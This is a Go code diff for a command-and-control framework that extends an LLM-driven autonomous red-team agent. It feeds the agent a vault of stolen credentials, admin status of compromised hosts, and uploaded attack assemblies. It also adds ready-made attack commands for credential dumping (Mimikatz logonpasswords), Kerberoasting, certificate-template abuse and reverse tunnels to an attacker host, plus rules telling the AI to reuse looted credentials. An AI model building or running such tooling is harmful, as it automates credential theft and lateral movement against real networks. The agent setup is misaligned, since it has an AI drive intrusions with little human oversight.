@@ -406,8 +406,8 @@ func (cl *CLI) aiAgentsList() string {
 		return "Sin agentes conectados."
 	}
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %s\n",
-		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "STATUS")
+	fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %-8s  %-7s  %s\n",
+		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "OS", "ADMIN", "STATUS")
 	for _, a := range agents {
 		id := a.ID
 		if len(id) > 8 {
@@ -417,8 +417,149 @@ func (cl *CLI) aiAgentsList() string {
 		if server.IsStale(a) || !a.Active {
 			status = "stale"
 		}
-		fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %s\n",
-			id, a.Hostname, a.Username, a.IP, a.Transport, status)
+		admin := "no"
+		if a.IsAdmin {
+			admin = "YES"
+		}
+		os := a.OS
+		if os == "" {
+			os = "windows"
+		}
+		fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %-8s  %-7s  %s\n",
+			id, a.Hostname, a.Username, a.IP, a.Transport, os, admin, status)
+	}
+	return sb.String()
+}
+
+func (cl *CLI) aiCredsList() string {
+	raw, err := cl.c.ListCreds("")
+	if err != nil {
+		return "[error: " + err.Error() + "]"
+	}
+	type cred struct {
+		Type     string `json:"type"`
+		Domain   string `json:"domain"`
+		Username string `json:"username"`
+		Secret   string `json:"secret"`
+		Host     string `json:"host"`
+		Source   string `json:"source"`
+	}
+	var creds []cred
+	if json.Unmarshal(raw, &creds) != nil || len(creds) == 0 {
+		return "Sin credenciales en el vault."
+	}
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", "TYPE", "DOMAIN\\USER", "HOST", "SECRET", "SOURCE")
+	for _, c := range creds {
+		user := c.Username
+		if c.Domain != "" {
+			user = c.Domain + "\\" + c.Username
+		}
+		secret := c.Secret
+		if len(secret) > 40 {
+			secret = secret[:40]
+		}
+		fmt.Fprintf(&sb, "%-8s  %-20s  %-20s  %-40s  %s\n", c.Type, user, c.Host, secret, c.Source)
+	}
+	return sb.String()
+}
+
+func (cl *CLI) aiUploadsList() string {
+	raw, err := cl.c.ListUploads()
+	if err != nil {
+		return ""
+	}
+	type upload struct {
+		AgentID  string `json:"agent_id"`
+		Filename string `json:"filename"`
+		Size     int64  `json:"size"`
+	}
+	var uploads []upload
+	if json.Unmarshal(raw, &uploads) != nil || len(uploads) == 0 {
+		return ""
+	}
+	// deduplicate by filename, prefer server-side (no agentID)
+	seen := map[string]bool{}
+	var sb strings.Builder
+	for _, u := range uploads {
+		if seen[u.Filename] {
+			continue
+		}
+		seen[u.Filename] = true
+		hint := asmHint(u.Filename)
+		if hint != "" {
+			fmt.Fprintf(&sb, "  %-30s  %s\n", u.Filename, hint)
+		} else {
+			fmt.Fprintf(&sb, "  %s\n", u.Filename)
+		}
+	}
+	return sb.String()
+}
+
+func asmHint(name string) string {
+	n := strings.ToLower(name)
+	switch {
+	case strings.Contains(n, "rubeus"):
+		return "dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt  OR  dotnet-exec Rubeus.exe asktgt /user:u /password:p /domain:d /ptt"
+	case strings.Contains(n, "sharpHound") || strings.Contains(n, "sharphound"):
+		return "dotnet-exec SharpHound.exe -c All -d domain.local --zipfilename out.zip"
+	case strings.Contains(n, "seatbelt"):
+		return "dotnet-exec Seatbelt.exe -group=all  OR  dotnet-exec Seatbelt.exe CredEnum LocalGroups"
+	case strings.Contains(n, "mimikatz"):
+		return "dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
+	case strings.Contains(n, "sharpwmi"):
+		return "dotnet-exec SharpWMI.exe action=exec computername=TARGET command=\"cmd /c whoami\""
+	case strings.Contains(n, "sharpview"):
+		return "dotnet-exec SharpView.exe Get-DomainUser -Identity admin"
+	case strings.Contains(n, "sharpup"):
+		return "dotnet-exec SharpUp.exe audit"
+	case strings.Contains(n, "certify"):
+		return "dotnet-exec Certify.exe find /vulnerable  OR  dotnet-exec Certify.exe request /ca:CA /template:tmpl /altname:admin"
+	case strings.Contains(n, "adpeas"):
+		return "dotnet-exec adPEAS.exe"
+	case strings.Contains(n, "winpeas"):
+		return "shell winPEAS.exe  (upload first: upload /tmp/winPEAS.exe)"
+	case strings.Contains(n, "chisel"):
+		return "shell chisel.exe client KALI_IP:PORT R:socks (then proxychains)"
+	case strings.Contains(n, "ligolo"):
+		return "shell ligolo-agent.exe -connect KALI_IP:PORT -ignore-cert"
+	case strings.Contains(n, "inveigh"):
+		return "dotnet-exec Inveigh.exe  (LLMNR/NBNS/mDNS poisoner)"
+	case strings.Contains(n, "sharpcollection"), strings.Contains(n, "sharpcolle"):
+		return "dotnet-exec assembly.exe [args]"
+	default:
+		return ""
+	}
+}
+
+func (cl *CLI) aiTargetsList() string {
+	raw, err := cl.c.ListTargets()
+	if err != nil {
+		return ""
+	}
+	type target struct {
+		IP       string `json:"ip"`
+		Hostname string `json:"hostname"`
+		OS       string `json:"os"`
+		Status   string `json:"status"`
+		Tags     string `json:"tags"`
+		Notes    string `json:"notes"`
+	}
+	var targets []target
+	if json.Unmarshal(raw, &targets) != nil || len(targets) == 0 {
+		return ""
+	}
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", "IP", "HOSTNAME", "OS", "STATUS", "NOTES/TAGS")
+	for _, t := range targets {
+		info := t.Tags
+		if t.Notes != "" {
+			if info != "" {
+				info += " | "
+			}
+			info += t.Notes
+		}
+		fmt.Fprintf(&sb, "%-16s  %-20s  %-12s  %-10s  %s\n", t.IP, t.Hostname, t.OS, t.Status, info)
 	}
 	return sb.String()
 }
@@ -574,8 +715,19 @@ ps / env                            process list, environment
 token whoami                        current privileges
 token steal <pid>                   steal token
 download <path>                     exfiltrate file
-dotnet-exec <assembly.exe> [args]   run .NET assembly in-process (Rubeus, SharpHound, Seatbelt, etc.)
-                                    uses native CLR host — no sacrificial process, no donut
+dotnet-exec <assembly.exe> [args]   run .NET assembly in-process (native CLR, no sacrificial process)
+  Common assemblies (check UPLOADED ASSEMBLIES section in context for what's available):
+    dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt
+    dotnet-exec Rubeus.exe asktgt /user:USER /password:PASS /domain:DOMAIN /ptt
+    dotnet-exec Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+    dotnet-exec SharpHound.exe -c All -d DOMAIN --zipfilename bh.zip
+    dotnet-exec Seatbelt.exe -group=all
+    dotnet-exec Seatbelt.exe CredEnum LocalGroups TokenPrivileges
+    dotnet-exec Mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+    dotnet-exec Certify.exe find /vulnerable
+    dotnet-exec Certify.exe request /ca:CA /template:TMPL /altname:administrator
+    dotnet-exec SharpUp.exe audit
+    dotnet-exec SharpView.exe Get-DomainUser -Identity admin
 
 === LOCAL ATTACK TOOLS (Kali) ===
 scan <ip> [-p ports]
@@ -636,7 +788,13 @@ RULES:
 - If a command fails, try alternative attack path
 - Never repeat the same failed command
 - Execute one command at a time, analyze output before proceeding
-- Truncated output means the full result was received; proceed based on what you see`
+- Truncated output means the full result was received; proceed based on what you see
+- certipy wrapper calls certipy-ad internally — use "certipy find ...", NOT "certipy-ad find ..."
+- gettgt syntax: gettgt <dc-ip> -d <domain> -u <user> -p <pass>  (NOT gettgt domain/user:pass)
+- finddelegation/getadusers/getadcomputers require explicit -u and -p flags (no interactive prompts)
+- dotnet-exec is the C2 in-process CLR command — NEVER call it via "shell dotnet-exec ..."
+- All credentials from the LOOT section are available to use — always try them before brute force
+- Check UPLOADED ASSEMBLIES in context — only use dotnet-exec with assemblies that are listed there`
 
 const aiChatSystemPrompt = `You are an expert red team operator assistant for Active Directory pentests.
 You have access to a C2 framework. Suggest commands using <cmd></cmd> tags — the operator will confirm before execution.
@@ -667,20 +825,52 @@ func (cl *CLI) cmdAIAuto(target, domain, model, ollamaURL string) {
 		agentNote = fmt.Sprintf("Agente activo: %s (ID: %s)", func() string {
 			for _, a := range agents {
 				if a.ID == cl.current {
-					return a.Username + "@" + a.Hostname
+					priv := "user"
+					if a.IsAdmin {
+						priv = "ADMIN"
+					}
+					return a.Username + "@" + a.Hostname + " [" + priv + "]"
 				}
 			}
 			return cl.current[:8]
 		}(), cl.current[:8])
 	}
 
+	credCtx := cl.aiCredsList()
+	uploadsCtx := cl.aiUploadsList()
+	targetsCtx := cl.aiTargetsList()
+
 	initialCtx := fmt.Sprintf(`TARGET IP:  %s
 DOMAIN:     %s
+
 LISTENERS:
 %s
-AGENTS:
+AGENTS (ID · Hostname · User · IP · Transport · OS · Admin):
 %s
-%s`, target, domain, cl.aiJobsList(), agentCtx, agentNote)
+%s
+
+LOOT — CREDENTIALS IN VAULT:
+%s
+
+DISCOVERED TARGETS/NETWORK:
+%s
+
+UPLOADED ASSEMBLIES (available for dotnet-exec):
+%s`, target, domain, cl.aiJobsList(), agentCtx, agentNote,
+		credCtx,
+		func() string {
+			if targetsCtx == "" {
+				return "Ninguno todavía — usar scan para descubrir."
+			}
+			return targetsCtx
+		}(),
+		func() string {
+			if uploadsCtx == "" {
+				return "Ninguno — subir con: upload /tmp/Rubeus.exe"
+			}
+			return uploadsCtx
+		}(),
+	)
 
 	msgs := []ollamaMsg{
 		{Role: "system", Content: aiAutoSystemPrompt},
